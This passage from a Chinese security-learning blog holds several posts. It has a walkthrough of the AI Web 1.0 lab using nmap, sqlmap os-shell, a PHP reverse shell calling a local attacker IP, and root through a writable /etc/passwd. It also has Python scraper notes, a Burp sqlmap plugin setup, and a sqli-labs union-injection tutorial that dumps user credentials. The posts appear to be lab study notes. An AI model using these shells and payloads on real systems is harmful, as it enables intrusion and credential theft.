seconds</code></pre><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><pre><code>└─$ sudo nmap -T4 -sV -O -A -p- 192.168.174.134[sudo] password for eraser: Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-12 13:36 CSTNmap scan report for 192.168.174.134Host is up (0.00071s latency).Not shown: 65534 closed tcp ports (reset)PORT   STATE SERVICE VERSION80/tcp open  http    Apache httpd| http-robots.txt: 2 disallowed entries |_/m3diNf0/ /se3reTdir777/uploads/|_http-server-header: Apache|_http-title: AI Web 1.0MAC Address: 00:0C:29:BD:8C:E3 (VMware)Device type: general purposeRunning: Linux 3.X|4.XOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4OS details: Linux 3.2 - 4.9Network Distance: 1 hopTRACEROUTEHOP RTT     ADDRESS1   0.71 ms 192.168.174.134OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 17.57 seconds</code></pre><p>可以看到开放了一个80端口，以及一些网站目录，尝试访问一下</p><h3 id="访问目标页面"><a href="#访问目标页面" class="headerlink" title="访问目标页面"></a>访问目标页面</h3><p><img src="/../image/image-20240312134058310.png" alt="image-20240312134058310"></p><p>谷歌都搜不到，没什么信息，继续看下其它目录有什么信息</p><h4 id="robots-txt资料"><a href="#robots-txt资料" class="headerlink" title="robots.txt资料"></a>robots.txt<a href="https://zhuanlan.zhihu.com/p/65463520">资料</a></h4><pre><code>User-agent: *Disallow: Disallow: /m3diNf0/Disallow: /se3reTdir777/uploads/</code></pre><p>查阅资料发现,robots.txt是网站管理者写给爬虫的一封信，里面描述了网站管理者不希望爬虫做的事，比如：</p><ul><li>不要访问某个文件、文件夹</li><li>禁止某些爬虫的访问</li><li>限制爬虫访问网站的频率</li></ul><pre><code>robots.txt的内容User-agent: 爬虫的名称Disallow: 不允许爬虫访问的地址Allow: 允许爬虫访问的地址若User-agent是*，则表示对象是所有爬虫。</code></pre><p><a href="https://developers.google.com/search/docs/crawling-indexing/robots/intro?hl=zh-cn">官方文档</a></p><p>结合以上信息，&#x2F;m3diNf0&#x2F;和&#x2F;se3reTdir777&#x2F;uploads&#x2F;是不希望访问的目录，推测里面有重要信息，但不知道具体内容，扫描下网站目录</p><pre><code>└─# dirb http://192.168.174.134/m3diNf0/ + http://192.168.174.134/m3diNf0/info.php (CODE:200|SIZE:84305)     .....└─# dirb http://192.168.174.134/se3reTdir777            ---- Scanning URL: http://192.168.174.134/se3reTdir777/ ----+ http://192.168.174.134/se3reTdir777/index.php (CODE:200|SIZE:1228) ...     </code></pre><p>可以看到前一个目录下有个info.php文件，后一个目录下有个index.php,分别尝试访问，</p><h2 id="x2F-m3diNf0"><a href="#x2F-m3diNf0" class="headerlink" title="&#x2F;m3diNf0"></a>&#x2F;m3diNf0</h2><h3 id="info-php"><a href="#info-php" class="headerlink" title="info.php"></a>info.php</h3><p><img src="/../image/image-20240312140833736.png" alt="image-20240312140833736"></p><p>发现绝对路径：&#x2F;home&#x2F;www&#x2F;html&#x2F;web1x443290o2sdf92213&#x2F;m3diNf0&#x2F;info.php </p><h3 id="index-php"><a href="#index-php" class="headerlink" title="index.php"></a>index.php</h3><p>一个是个看着很明显的sql注入界面，输入1提交一下，有回显</p><p><img src="/../image/image-20240312141051083.png" alt="image-20240312141051083"></p><p>判断是否存在注入点，输入分号试试</p><p><img src="/../image/image-20240312141259232.png" alt="image-20240312141259232"></p><p>存在报错</p><h4 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h4><p>这里我们先抓包，确认请求参数</p><pre><code class="console">POST /se3reTdir777/index.php HTTP/1.1Host: 192.168.174.134User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedContent-Length: 22Origin: http://192.168.174.134Connection: closeReferer: http://192.168.174.134/se3reTdir777/index.phpUpgrade-Insecure-Requests: 1uid=1&amp;Operation=Submit</code></pre><p>可以看到注入参数为“uid&#x3D;1&amp;Operation&#x3D;Submit”</p><p>下面用sqlmap爆破数据库</p><pre><code>python sqlmap.py -u &quot;http://192.168.174.134/se3reTdir777/index.php&quot; --data &quot;uid=1&amp;Operation=Submit&quot; --dbs</code></pre><p><img src="/../image/image-20240312144608515.png" alt="image-20240312144608515"></p><p>看看aiweb1里的表</p><pre><code>python sqlmap.py -u &quot;http://192.168.174.134/se3reTdir777/index.php&quot; --data &quot;uid=1&amp;Operation=Submit&quot; -D aiweb1 --tables</code></pre><p><img src="/../image/image-20240312144720285.png" alt="image-20240312144720285"></p><p>看看表里的数据</p><pre><code>python sqlmap.py -u &quot;http://192.168.174.134/se3reTdir777/index.php&quot; --data &quot;uid=1&amp;Operation=Submit&quot; -D aiweb1 -T user --dump</code></pre><p><img src="/../image/image-20240312145259001.png" alt="image-20240312145259001"></p><p>没什么有用信息</p><p>尝试使用sqlmap的–os-shell命令</p><p>os-shell执行条件有三个：<br>　 1.网站必须是root权限<br>　 2.网站的绝对路径已知<br>　 3.GPC为off（php主动转义的功能关闭）</p><p>依次选择 php(default)，custom location(s)<br>根据前面找到的info.php文件暴露的信息，绝对路径选择：&#x2F;home&#x2F;www&#x2F;html&#x2F;web1x443290o2sdf92213&#x2F;se3reTdir777&#x2F;uploads&#x2F;<br>uploads的目录是可以成功写入的</p><pre><code>python sqlmap.py -u &quot;http://192.168.174.134/se3reTdir777&quot; --data &#39;uid=1&amp;Operation=Submit&#39; --level=3 --os-shell</code></pre><p><img src="/../image/image-20240312150251817.png" alt="image-20240312150251817"></p><p>成功反弹到shell，但是权限极低，面临提权问题</p><h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>准备好一个提权脚本</p><pre><code>&lt;?php$sock=fsockopen(&quot;192.168.174.137&quot;,8888);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);?&gt;</code></pre><p><strong>使用python搭建一个简易的服务器</strong></p><pre><code class="python">python -m http.server 9966#9966为端口号，可自己指定</code></pre><p>此时简易服务器已搭建完成，接下来打开网页，访问本机，查看搭建是否成功</p><p><img src="/../image/image-20240312151128619.png" alt="image-20240312151128619"></p><p><strong>下载文件到靶机</strong></p><p>回到我们控制目标shell的窗口，下载文件</p><pre><code class="console">wget -S http://192.168.174.137:9966/test.php</code></pre><p><img src="/../image/image-20240312151226436.png" alt="image-20240312151226436"></p><p>有时候可能会出现异常，多试几次就可以了。再打开一个终端，对8888端口进行监听：<strong>nc -lvp 8888</strong>,之后就直接运行文件 <strong>php shell.php</strong> 就可成功反弹shell</p><p><img src="/../image/image-20240312151346480.png" alt="image-20240312151346480"></p><p><strong>提权到root</strong></p><p>可以用python转换成交互式shell，这样看着更舒服</p><pre><code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code></pre><p><img src="/../image/image-20240312152427442.png" alt="image-20240312152427442"></p><p>发现当前用户不是root用户但是这个用户可以对&#x2F;etc&#x2F;passwd 文件进行写入权限</p><pre><code>ls -l /etc</code></pre><p><img src="/../image/image-20240312152835669.png" alt="image-20240312152835669"></p><p>所以我们尝试添加一个用户登录，因为写入的时候密码是加密的，所以要先加密密码,：</p><pre><code>openssl passwd -1 -salt web1 123456   //用openssl生成用户，用户名为panda ，密码为 panda$1$web1$ZrYgDZgZpLlsnVlxUaZwh/   //生成后/etc/passwd储存用户格式的文件panda:$1$web1$ZrYgDZgZpLlsnVlxUaZwh/:0:0:root:/root:/bin/bash  //写入/etc/passwd文件的格式</code></pre><p>然后再来写入密码：</p><pre><code>echo &#39;web1:$1$web1$ZrYgDZgZpLlsnVlxUaZwh/:0:0::/root:/bin/bash&#39;&gt;&gt;/etc/passwd</code></pre><p><img src="/../image/image-20240312153132553.png" alt="image-20240312153132553"></p><p>切换用户到我们刚刚自己创建的 web1</p><p><img src="/../image/image-20240312153441484.png" alt="image-20240312153441484"></p><p>查看权限，已经是root权限，并且成功拿取到flag</p><p><img src="/../image/image-20240312153548149.png" alt="image-20240312153548149"></p><p><img src="/../image/image-20240312153911324.png" alt="image-20240312153911324"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python爬虫</title>
      <link href="/2024/03/15/python%E7%88%AC%E8%99%AB/"/>
      <url>/2024/03/15/python%E7%88%AC%E8%99%AB/</url>
      
        <content type="html"><![CDATA[<p><a href="https://requests.readthedocs.io/projects/cn/zh-cn/latest/">python request官方文档</a></p><h2 id="python爬虫"><a href="#python爬虫" class="headerlink" title="python爬虫"></a>python爬虫</h2><h2 id="爬百度翻译"><a href="#爬百度翻译" class="headerlink" title="爬百度翻译"></a>爬百度翻译</h2><p>在翻译网站随便输入个中文翻译，然后按F12</p><p><img src="/../image/image-20240315222830216.png" alt="image-20240315222830216"></p><p>知道带正确返回的值，然后查看标头，就能知道url了</p><p><img src="/../image/image-20240315222919311.png" alt="image-20240315222919311"></p><p>然后也要注意请求方法，对于参数我们可以去payload（载荷）看</p><p><img src="/../image/image-20240315223000282.png" alt="image-20240315223000282"></p><p>之前找错了，那个表单有个sign和ts（时间戳），这两个是会变化的值，在写data的时候不容易弄，发现sug里有个更简单的表单数据，就用这个了，下面是代码.</p><pre><code class="python">import requestsimport time# timestamp = time.time()# print(&quot;当前时间戳：&quot;, timestamp)while True:    word = input(&quot;请输入你需要翻译的中文(q-退出)：&quot;)    if word == &#39;q&#39;:        break    else:        data = &#123;            &#39;kw&#39;:word,        &#125;        resp = requests.post(&quot;https://fanyi.baidu.com/sug&quot;,data)        # &#123;&quot;errno&quot;:997,&quot;errmsg&quot;:&quot;\u672a\u77e5\u9519\u8bef&quot;,&quot;logid&quot;:2920036812,&quot;query&quot;:&quot;\u72d7&quot;,&quot;from&quot;:&quot;zh&quot;,&quot;to&quot;:&quot;en&quot;,&quot;error&quot;:997&#125;        # json        json_data = resp.json()        print(json_data) #获取数据格式        data_list = json_data[&#39;data&#39;]        for data in  data_list:            print(data[&#39;k&#39;] + &quot;： &quot; + data[&#39;v&#39;])</code></pre><p><img src="/../image/image-20240315223118283.png" alt="image-20240315223118283"></p><h2 id="爬美女图片"><a href="#爬美女图片" class="headerlink" title="爬美女图片"></a>爬美女图片</h2><pre><code>import requestsurl = &#39;https://cdn.seovx.com/?mom=302&#39;resp = requests.get(url=url)#print(resp.text)with open(&#39;./tu.png&#39;, mode=&#39;wb&#39;) as f:    f.write(resp.content)#print(&#39;保存成功&#39;)</code></pre><p><img src="/../image/image-20240315231837221.png" alt="image-20240315231837221"></p><h2 id="爬视频"><a href="#爬视频" class="headerlink" title="爬视频"></a>爬视频</h2><pre><code class="python">url=&#39;https://api.linhun.vip/api/Littlesistervideo?type=json&amp;apiKey=05961127134-89951501711-d6a79dfe896&#39;resp = requests.get(url=url)print(resp.json())url2 = resp.json()[&#39;video&#39;]#print(url2)content = requests.get(url=url2).contentwith open(&#39;girl.mp4&#39;, mode=&#39;wb&#39;) as f:    f.write(content)</code></pre><p>要注意，里面有个apiKey是需要手动获取的，是为了防止恶意使用，然后这种别的媒体的形式，需要获取字节码，然后保存到相应格式的文件中。</p><h2 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h2><p><strong>1.<strong><strong>访问</strong></strong><a href="https://news.sina.com.cn/roll/#pageid=153&lid=2509&k=&num=50&page=2">新浪微博网页</a></strong></p><p><img src="file:///C:/Users/yxz/AppData/Local/Temp/msohtmlclip1/01/clip_image002.jpg" alt="img"></p><p>查看网页源代码，可以发现这些新闻链接是通过js生成的，所以我们需要查看js页面</p><p>*<em>2.<strong><strong>分析</strong></strong>js</em>*<strong>页面</strong></p><p><img src="file:///C:/Users/yxz/AppData/Local/Temp/msohtmlclip1/01/clip_image004.jpg" alt="img"></p><p>找到get请求返回的页面，查看信息，可以发现链接和标题都在里面，所以我们需要提取的页面是这个</p><p>*<em>3.<strong><strong>提取</strong></strong>js</em>*<strong>页面</strong></p><p>首先很明显是一个json格式，需要切片，转换格式，然后根据实际情况提取信息即可</p><p>  import json   import requests   url &#x3D; “<a href="https://feed.mix.sina.com.cn/api/roll/get?pageid=153&amp;lid=2509&amp;k=&amp;num=50&amp;page=2&amp;r=0.3009011709274978&amp;callback=jQuery111202890527579006905_1716863975570&amp;_=1716863975571&quot;">https://feed.mix.sina.com.cn/api/roll/get?pageid=153&amp;lid=2509&amp;k=&amp;num=50&amp;page=2&amp;r=0.3009011709274978&amp;callback=jQuery111202890527579006905_1716863975570&amp;_=1716863975571&quot;</a> <em>#</em> *替换为实际的页面链接 *  response &#x3D;  requests.get(url)   reply &#x3D; json.loads(response.text[46:-14])   <em>#print(len(reply[‘result’][‘data’]))</em>   for i in reply[‘result’][‘data’]:     *#print(i) *    print(i[“url”])     print(i[“title”])     </p><p>这里就不每个页面都提取了，如果需要提取，可以改成以下格式</p><pre><code>for page_num in range(1, num):   url = &quot;https://feed.mix.sina.com.cn/api/roll/get?pageid=153&amp;lid=2509&amp;k=&amp;num=50&amp;page=&#123;&#125;&amp;r=0.3009011709274978&amp;callback=jQuery111202890527579006905_1716863975570&amp;_=1716863975571&quot;.format(page_num)   print(url)</code></pre><p>可以看看title和相应网页里面的标题是否一致</p><p><img src="file:///C:/Users/yxz/AppData/Local/Temp/msohtmlclip1/01/clip_image006.jpg" alt="img"></p><p><img src="file:///C:/Users/yxz/AppData/Local/Temp/msohtmlclip1/01/clip_image008.jpg" alt="img"></p><p>可以看到标题和链接都是对应的，下面就是进入相应的网页提取文本和配图了</p><p>**4.**<strong>提取正文和配图</strong></p><p>进入目标页面，查看网页源代码，找到网页确定正文的逻辑</p><p><img src="file:///C:/Users/yxz/AppData/Local/Temp/msohtmlclip1/01/clip_image010.jpg" alt="img"></p><p>可以看到正文都是在id为artibody的div下，且每段文字都由p标签包裹，所以我们可以通过确定这两个元素来获取正文内容，需要注意的是当div为null时，是没有find_all方法的，我们需要先判断div元素是否存在。</p><pre><code>*#* *判断* *&lt;div&gt;* *元素是否存在 *  if div_element is not None:   p_tags = div_element.find_all(&quot;p&quot;)   *#* *遍历每个* *&lt;p&gt;* *标签，获取内容 *   content = &quot;\n&quot;.join([p.text for p in p_tags])   *#* *提取配图链接 *   img_tags = div_element.find_all(&quot;img&quot;)   image_urls = [f&quot;https:&#123;img[&#39;src&#39;]&#125;&quot; for img in img_tags]   *#* *创建新闻文件夹 *   news_dir = os.path.join(save_dir, title)   os.makedirs(news_dir, exist_ok=True)   *#* *保存新闻标题和正文到文件 *   with open(os.path.join(news_dir, &quot;content.txt&quot;), &quot;w&quot;, encoding=&quot;utf-8&quot;) as f:     f.write(content)</code></pre><p><img src="file:///C:/Users/yxz/AppData/Local/Temp/msohtmlclip1/01/clip_image012.jpg" alt="img"></p><p>可以看到获取到了相应的正文内容，下面就是获取img了，同样的原理，获取相应的img标签即可</p><pre><code>*#* *提取配图链接 *  img_tags = div_element.find_all(&quot;img&quot;)  for img_tag in img_tags:  image_url=&quot;https:&quot; +img_tag.get(&quot;src&quot;)  print(image_url)  *#* *下载配图 *  image_response = requests.get(image_url)  image_name = os.path.basename(image_url)  image_path = os.path.join(&quot;news_data&quot;, image_name)  with open(image_path, &quot;wb&quot;) as f:   f.write(image_response.content)</code></pre><p><img src="file:///C:/Users/yxz/AppData/Local/Temp/msohtmlclip1/01/clip_image014.jpg" alt="img"></p><p><img src="file:///C:/Users/yxz/AppData/Local/Temp/msohtmlclip1/01/clip_image016.jpg" alt="img"></p><p>**5.**<strong>保存成对应的文件夹，并做异常处理</strong></p><p><img src="file:///C:/Users/yxz/AppData/Local/Temp/msohtmlclip1/01/clip_image018.jpg" alt="img"></p><p>在img处添加try：catch</p><pre><code>*#* *下载配图并保存到文件 *  for i, image_url in enumerate(image_urls):   try:     response = requests.get(image_url)     image_name = f&quot;image_&#123;i+1&#125;.jpg&quot;     image_path = os.path.join(news_dir, image_name)     with open(image_path, &quot;wb&quot;) as f:       f.write(response.content)   except requests.exceptions.InvalidURL:     print(f&quot;Invalid URL: &#123;image_url&#125;&quot;)</code></pre><p><img src="file:///C:/Users/yxz/AppData/Local/Temp/msohtmlclip1/01/clip_image020.jpg" alt="img"></p><p><img src="file:///C:/Users/yxz/AppData/Local/Temp/msohtmlclip1/01/clip_image022.jpg" alt="img"></p><p>完整代码：</p><pre><code class="python">import jsonimport osimport requestsfrom bs4 import BeautifulSoup# 定义保存路径save_dir = &quot;news_data&quot;os.makedirs(save_dir, exist_ok=True)url = &quot;https://feed.mix.sina.com.cn/api/roll/get?pageid=153&amp;lid=2509&amp;k=&amp;num=50&amp;page=2&amp;r=0.3009011709274978&amp;callback=jQuery111202890527579006905_1716863975570&amp;_=1716863975571&quot;  # 替换为实际的页面链接response = requests.get(url)reply = json.loads(response.text[46:-14])links = []for i in reply[&#39;result&#39;][&#39;data&#39;]:    links.append(i[&quot;url&quot;])for link in links:    response = requests.get(link)    response.encoding = &quot;utf-8&quot;    news_soup = BeautifulSoup(response.text, &quot;html.parser&quot;)    # 提取新闻标题    title = news_soup.find(&quot;h1&quot;).text    # 提取新闻正文    div_element = news_soup.find(&quot;div&quot;, id=&quot;artibody&quot;)    # 判断 &lt;div&gt; 元素是否存在    if div_element is not None:        p_tags = div_element.find_all(&quot;p&quot;)        # 遍历每个 &lt;p&gt; 标签，获取内容        content = &quot;\n&quot;.join([p.text for p in p_tags])        # 提取配图链接        img_tags = div_element.find_all(&quot;img&quot;)        image_urls = [f&quot;https:&#123;img[&#39;src&#39;]&#125;&quot; for img in img_tags]        # 创建新闻文件夹        news_dir = os.path.join(save_dir, title)        os.makedirs(news_dir, exist_ok=True)        # 保存新闻标题和正文到文件        with open(os.path.join(news_dir, &quot;content.txt&quot;), &quot;w&quot;, encoding=&quot;utf-8&quot;) as f:            f.write(content)        # 下载配图并保存到文件        for i, image_url in enumerate(image_urls):            try:                response = requests.get(image_url)                image_name = f&quot;image_&#123;i+1&#125;.jpg&quot;                image_path = os.path.join(news_dir, image_name)                with open(image_path, &quot;wb&quot;) as f:                    f.write(response.content)            except requests.exceptions.InvalidURL:                print(f&quot;Invalid URL: &#123;image_url&#125;&quot;)        print(f&quot;Saved news: &#123;title&#125;&quot;)    else:        print(f&quot;No content found for: &#123;title&#125;&quot;)</code></pre><h2 id="Xpath解析"><a href="#Xpath解析" class="headerlink" title="Xpath解析"></a>Xpath解析</h2><p>xpath各种用法节点: 每个HTML标签叫节点最外层节点:</p><p> 根节点内层节点: 子节点父子节点: &lt;爹&gt;&lt;子&gt;&lt;&#x2F;子&gt;&lt;&#x2F;梦&gt;</p><p>xpath提取到的内容不论多少，都会返回列表</p><p><a href="https://desk.zol.com.cn/%E5%A3%81%E7%BA%B8%E7%BD%91%E7%AB%99https://desk.zol.com.cn/meinv/">https://desk.zol.com.cn/壁纸网站https://desk.zol.com.cn/meinv/</a></p><h1 id="并发编程"><a href="#并发编程" class="headerlink" title="并发编程"></a>并发编程</h1><pre><code class="python">import threadingdef func(a1,a2,a3):    passt = threading.Thread(target=func, args=(1,2,3))t.start</code></pre><h2 id="多进程"><a href="#多进程" class="headerlink" title="多进程"></a>多进程</h2><pre><code class="python">import multiprocessingt = multiprocessing.Process(target=funcname,args=())t.start</code></pre><p>多进程要放在</p><pre><code class="python">if name=&quot;__main__&quot;: </code></pre><p>否则windows下会报错，因为linux时基于fork，win是spawn</p>]]></content>
      
      
      
        <tags>
            
            <tag> pthon </tag>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>burp+sqlmap</title>
      <link href="/2024/03/14/burp-sqlmap/"/>
      <url>/2024/03/14/burp-sqlmap/</url>
      
        <content type="html"><![CDATA[<h1 id="burp-sqlmap"><a href="#burp-sqlmap" class="headerlink" title="burp+sqlmap"></a>burp+sqlmap</h1><p>第一步：Extend-&gt;BApp store-&gt;SQLIpy Sqlmap Interation</p><p><img src="/../image/image-20240314185825308.png" alt="image-20240314185825308"></p><p>要先安装一下jython<a href="https://www.jython.org/download.html">https://www.jython.org/download.html</a></p><p><img src="/../image/image-20240314191141359.png" alt="image-20240314191141359"></p><p><img src="/../image/image-20240314191049446.png" alt="image-20240314191049446"></p><p>连接失败，去这个网站<a href="https://portswigger.net/bappstore/%E4%B8%8B%E8%BD%BD">https://portswigger.net/bappstore/下载</a></p><p><img src="/../image/image-20240314192650903.png" alt="image-20240314192650903"></p><p><img src="/../image/image-20240314192707918.png" alt="image-20240314192707918"></p><p>如果启动时会报错，可能时jyphon有问题，去重新下或换个版本就行</p>]]></content>
      
      
      
        <tags>
            
            <tag> tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql</title>
      <link href="/2024/03/02/sql/"/>
      <url>/2024/03/02/sql/</url>
      
        <content type="html"><![CDATA[<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><p>1、查找注入点</p><p>2、判断是字符型还是数字型注入 </p><p>3、如果字符型，找到他的闭合方式</p><p>4、判断查询列数，group by 或 order by</p><p>5、查询回显位置 -1（id要是不存在的数据）</p><h2 id="注入分类"><a href="#注入分类" class="headerlink" title="注入分类"></a>注入分类</h2><ul><li><p>按照查询字段</p><ul><li>字符型:输入参数为整形</li><li>数字型:输入参数为字符型</li></ul></li><li><p>按照注入方法</p><ul><li>Union注入</li><li>报错注入</li><li>布尔注入</li><li>时间注入</li></ul></li></ul><h2 id="注入点"><a href="#注入点" class="headerlink" title="注入点"></a>注入点</h2><p>注入点就是可以实行注入的地方，通常是一个访问数据库的连接，如本页面的注入点input the ID</p><h3 id="Less1"><a href="#Less1" class="headerlink" title="Less1"></a>Less1</h3><p><img src="/../image/image-20240131141452662.png" alt="image-20240131141452662"></p><h2 id="如何判断是字符型还是数字型"><a href="#如何判断是字符型还是数字型" class="headerlink" title="如何判断是字符型还是数字型"></a>如何判断是字符型还是数字型</h2><p>实用and 1&#x3D;1 和and 1&#x3D;2来判断，数字型一般提交内容为数字，但数字不一定为数字型。</p><p>Less-1 提交and 1&#x3D;1和提交and 1&#x3D;2，如果是数字型，你1&#x3D;2就不会正常显示，是字符型则仍能正常显示，这里是字符型</p><p><img src="/../image/image-20240131142319694.png" alt="image-20240131142319694"></p><p>Less-2则是数字型了</p><p><img src="/../image/image-20240131142425527.png" alt="image-20240131142425527"></p><p>也可以直接用运算2-1如果显示的是2的数据则是字符型，注意+号会被认为是空格</p><p><img src="/../image/image-20240131142754670.png" alt="image-20240131142754670"></p><h2 id="闭合方式"><a href="#闭合方式" class="headerlink" title="闭合方式"></a>闭合方式</h2><p>一个单引号-‘</p><p>两个单引号’’</p><p>一个单引号’+)</p><p>两个单引号’’+)</p><p>或双引号</p><p>其他</p><h3 id="如何判断闭合方式"><a href="#如何判断闭合方式" class="headerlink" title="如何判断闭合方式"></a>如何判断闭合方式</h3><p>例如Less-1输入?id&#x3D;1’‘’报错为 near ‘’1’’’’ LIMIT 0,1多一个’闭合符为‘’,还有一个–+ 可以把面的内容注释掉</p><p><img src="/../image/image-20240131151415891.png" alt="image-20240131151415891"></p><p>在Less-3中先输入一个’会报错，可以看到有个括号,</p><p><img src="/../image/image-20240131151501215.png" alt="image-20240131151501215"></p><p>这时候可以括号闭合，再注释后面的内容</p><h3 id="闭合的作用"><a href="#闭合的作用" class="headerlink" title="闭合的作用"></a>闭合的作用</h3><p><img src="/../image/image-20240131151703697.png" alt="image-20240131151703697"></p><h2 id="Union联合注入"><a href="#Union联合注入" class="headerlink" title="Union联合注入"></a>Union联合注入</h2><p>提交：?id&#x3D;1’ union select database () –+</p><p>需要注意列数，可以先group by + 数字判断列数</p><p><a href="http://localhost/sqli-labs/Less-1/?id=1&#39;">http://localhost/sqli-labs/Less-1/?id=1&#39;</a> group by 4–+到四就报错了，说明有3列，用二分法就好了，还可以order by + 数字</p><p><img src="/../image/image-20240131152330244.png" alt="image-20240131152330244"></p><p><a href="http://localhost/sqli-labs/Less-1/?id=1&#39;">http://localhost/sqli-labs/Less-1/?id=1&#39;</a> union select 1,2,3–+</p><p>列数要一致，但有时候不一定都显示，所以我们需要放在可以显示的列，phpmyadmin没用了。。</p><p>select * from users where id&#x3D;’1’ union select 1,2,3;</p><p><img src="/../image/image-20240131153436408.png" alt="image-20240131153436408"></p><p>但页面只显示第一行，所以可以把id设置成-1</p><p><img src="/../image/image-20240131153600297.png" alt="image-20240131153600297"></p><p><a href="http://localhost/sqli-labs/Less-1/?id=-1&#39;">http://localhost/sqli-labs/Less-1/?id=-1&#39;</a> union select 1,2,database()–+</p><p>所以可以将3换成database()就可以查到库名了</p><p><img src="/../image/image-20240131212132753.png" alt="image-20240131212132753"></p><p>2也可以用，但1不行，因为1没有回显位，version()可以用来显示版本</p><p><img src="/../image/image-20240131212742386.png" alt="image-20240131212742386"></p><pre><code class="mysql"> union select 1,version(),databse() --+</code></pre><p>页面只能显示一个内容,第二句的内容是不显示的，可以把第- -的内容改为数据库不存在的数据，如id&#x3D;0。</p><p>?id&#x3D;1’ union select 1,2,database() –+</p><h3 id="关键数据库、数据表、数据列、group-concat作用"><a href="#关键数据库、数据表、数据列、group-concat作用" class="headerlink" title="关键数据库、数据表、数据列、group_concat作用"></a>关键数据库、数据表、数据列、group_concat作用</h3><ul><li>数据库：Information_schema（包含所有mysql数据库的简要信息）<ul><li>数据表：tables<ul><li>表名集合表</li></ul></li><li>数据表：columns<ul><li>列名集合表</li></ul></li></ul></li></ul><p>但waf对这个有防御，不怎么容易用上</p><h3 id="查找表名"><a href="#查找表名" class="headerlink" title="查找表名"></a>查找表名</h3><p>走到确定回显位的时候</p><pre><code class="mysql">union select 1,table_name,3 from information_schema.tables --+</code></pre><p><img src="/../image/image-20240131214415498.png" alt="image-20240131214415498"></p><p>但里面数据这么多，这里只显示一个，所以需要限制条件</p><pre><code class="mysql">union select 1,table_name,3 from information_schema.tables where table_schema=database() --+</code></pre><p><img src="/../image/image-20240131214715798.png" alt="image-20240131214715798"></p><p>也可以直接用刚刚得到的数据库名，但函数更好用一些，有的防火墙不一定过滤函数</p><p>但表名还是只能显示一个，这是时候就要用到**group_concat()**把多个列名合在一起</p><pre><code class="mysql">union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+</code></pre><p>把table_name作为参数放到group_concat()函数就可以了</p><p><img src="/../image/image-20240131215006002.png" alt="image-20240131215006002"></p><h3 id="查找列名"><a href="#查找列名" class="headerlink" title="查找列名"></a>查找列名</h3><pre><code class="mysql">union select 1,column_name,3 from information_schema.columns --+</code></pre><p>同样的思路，最终语句如下</p><pre><code class="mysql">union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=databse() and table_namme=&#39;你需要的那个表&#39;--+</code></pre><p>我这里以user表为例子</p><pre><code class="mysql">union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name=&#39;users&#39; --+</code></pre><p><img src="/../image/image-20240131221726938.png" alt="image-20240131221726938"></p><p>我们也可以在mysql里直接看</p><pre><code class="mysql">show columns from security.users;</code></pre><p><img src="/../image/image-20240131222241062.png" alt="image-20240131222241062"></p><p>确实是这三个</p><h3 id="查找最终目标"><a href="#查找最终目标" class="headerlink" title="查找最终目标"></a>查找最终目标</h3><p>查找里面的内容，比如我们要获取user表里的username和password，一样的思路</p><pre><code class="mysql">union select 1,group_concat(username,password),3 from users --+</code></pre><p><img src="/../image/image-20240131224502718.png" alt="image-20240131224502718"></p><p>聚在一起不好看，可以插入”~”区分数据</p><pre><code class="mysql">union select 1,group_concat(username,&#39;~&#39;,password),3 from users --+</code></pre><p><img src="/../image/image-20240131224606034.png" alt="image-20240131224606034"></p><h3 id="数字型union注入"><a href="#数字型union注入" class="headerlink" title="数字型union注入"></a>数字型union注入</h3><h4 id="总结流程"><a href="#总结流程" class="headerlink" title="总结流程"></a>总结流程</h4><ol><li>确定数字型还是字符型</li><li>使用group by的二分法判断union语句中前一个查询的列数</li><li>优化语句，将id改为一个不存在的数字</li><li>使用select语句，查询靶机数据库库名</li><li>使用select语句，查询靶机所有表名</li><li>使用select语句，查询靶机所有列名</li><li>查询所有用户名密码</li></ol><h3 id="拿Less2练练手"><a href="#拿Less2练练手" class="headerlink" title="拿Less2练练手"></a>拿Less2练练手</h3><p>一样，判断注入点？id&#x3D;1有回显</p><p><img src="/../image/image-20240131225137471.png" alt="image-20240131225137471"></p><p>然后id&#x3D;2-1判断类型</p><p><img src="/../image/image-20240131225153111.png" alt="image-20240131225153111"></p><p>结果和id&#x3D;1一样，所以是数字型，就不加’了，在最后加个#号注释即可，或–+，查列数id&#x3D;1 order by 3 –+，和之前一样是三列</p><p><img src="/../image/image-20240131225347565.png" alt="image-20240131225347565"></p><p>判断回显位置,这里就不用1，2，3了,注意id要是-1或者0</p><pre><code class="mysql">id=-1 union select 1,version(),database() --+</code></pre><p><img src="/../image/image-20240131225633817.png" alt="image-20240131225633817"></p><p>知道回显位置后，查表名（库名知道了）</p><pre><code class="mysql">union select 1,group_concat(table_name),3 from information_schema.tables  where table_schema=&#39;security&#39; --+</code></pre><p><img src="/../image/image-20240131225915149.png" alt="image-20240131225915149"></p><p>查到表名再查列名，因为回显得是name和password，那就查这个，试试user表</p><pre><code class="mysql">union select 1,group_concat(column_name),3 from information_schema.columns  where table_schema=&#39;security&#39; and table_name=&#39;users&#39; --+</code></pre><p><img src="/../image/image-20240131230226025.png" alt="image-20240131230226025"></p><p>结果一样的，没什么变化，再查具体信息,这里就不加~了，</p><pre><code 